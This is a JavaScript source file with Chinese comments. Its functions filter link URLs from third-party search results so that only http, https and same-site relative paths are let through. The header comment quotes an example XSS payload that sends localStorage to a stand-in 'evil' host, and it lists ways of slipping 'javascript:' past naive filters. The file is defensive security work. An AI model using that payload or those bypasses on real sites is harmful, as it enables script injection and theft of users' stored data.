/**
 * 外部链接的协议闸门（2026-11-05 安全审查补）
 *
 * 为什么需要独立一份：联网搜索的 `url` 来自第三方（Tavily / 免费代理）的响应，
 * 内容受 SEO 投毒影响 —— 攻击者能让一条结果的 url 变成 `javascript:fetch('//evil?'+localStorage...)`。
 * 前端把它直接绑进 `<a :href>` 时，Vue **不会**拦伪协议，点一下就等于在站点源执行脚本。
 *
 * 口径：只放行 `http:` / `https:`，其余（`javascript:` `data:` `blob:` `vbscript:`
 * 以及任何解析失败的字符串）一律返回空串。调用方拿到空串就该退化成纯文本，
 * 不要再去拼 href。
 *
 * ⚠️ 为什么不用「正则里禁 javascript:」：`java\tscript:`、`JaVaScRiPt:`、
 *    前导空白、`%6a%61vascript:` 都是绕法。解析成 URL 再判 protocol 只有一份真值。
 */

/** @param {unknown} value @returns {string} 可安全放进 href 的绝对地址，或 '' */
export function toSafeExternalHref(value) {
  const text = String(value ?? '').trim();
  if (!text) return '';
  try {
    const parsed = new URL(text);
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return '';
    return parsed.href;
  } catch {
    return '';
  }
}

/** 站内相对路径也允许（`/user-space?tab=posts`），其余同 toSafeExternalHref 的规则。 */
export function toSafeNavHref(value) {
  const text = String(value ?? '').trim();
  if (!text) return '';
  if (text.startsWith('/') && !text.startsWith('//')) return text;
  return toSafeExternalHref(text);
}
